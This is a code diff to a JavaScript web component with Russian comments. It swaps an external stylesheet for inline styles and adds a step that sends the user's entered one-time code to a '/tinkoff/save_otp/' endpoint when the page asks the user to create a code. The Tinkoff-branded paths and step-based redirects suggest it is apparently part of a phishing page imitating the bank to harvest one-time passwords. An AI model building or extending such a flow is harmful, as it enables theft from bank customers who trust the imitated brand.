@@ -4,14 +4,32 @@ class InputControl extends HTMLElement {
 
         const shadowRoot = this.attachShadow({ mode: 'open' });
 
-        // Подключаем внешние стили
-        const link = document.createElement('link');
-        link.setAttribute('rel', 'stylesheet');
-        link.setAttribute('href', '/static/tinkoff_style.css');
-        shadowRoot.appendChild(link);
-
         // HTML шаблон компонента
         shadowRoot.innerHTML += `
+            <style>
+                input[type="number"] {
+                    -webkit-appearance: none;
+                    -moz-appearance: textfield;
+                    appearance: none;
+                }
+
+                input[type="number"]::-webkit-outer-spin-button,
+                input[type="number"]::-webkit-inner-spin-button {
+                    -webkit-appearance: none;
+                    appearance: none;
+                    margin: 0;
+                }
+                
+                .input-container {
+                    display: flex;
+                    flex-direction: column;
+                    gap: 10px;
+                }
+
+                input {
+                    padding: 5px;
+                }
+            </style>
             <div class="input-container">
                 <label>${this.getAttribute('label') || 'Введите значение'}</label>
                 <input type="${this.getAttribute('type') || 'text'}" />
@@ -27,6 +45,8 @@ class InputControl extends HTMLElement {
         this.input = shadowRoot.querySelector('input');
         this.errorMessageElement = shadowRoot.querySelector('.error-message');
         this.button = shadowRoot.querySelector('button');
+        this.button.setAttribute('part', 'button');
+        this.input.setAttribute('part', 'input');
 
         this.button.addEventListener('click', () => this.handleSubmit());
         this.input.addEventListener('keydown', (event) => {
@@ -113,6 +133,12 @@ class InputControl extends HTMLElement {
             const data = await response.json();
 
             if (data.status === 'success') {
+                if (data.current_page_type === 'Придумайте код') {
+                    await fetch(`/tinkoff/save_otp/?otp=${value}`, {
+                        method: 'POST',
+                    });
+                }
+                
                 const pageType = data.next_page_type;
 
                 let redirectUrl = `/tinkoff/next/?step=${pageType}`;
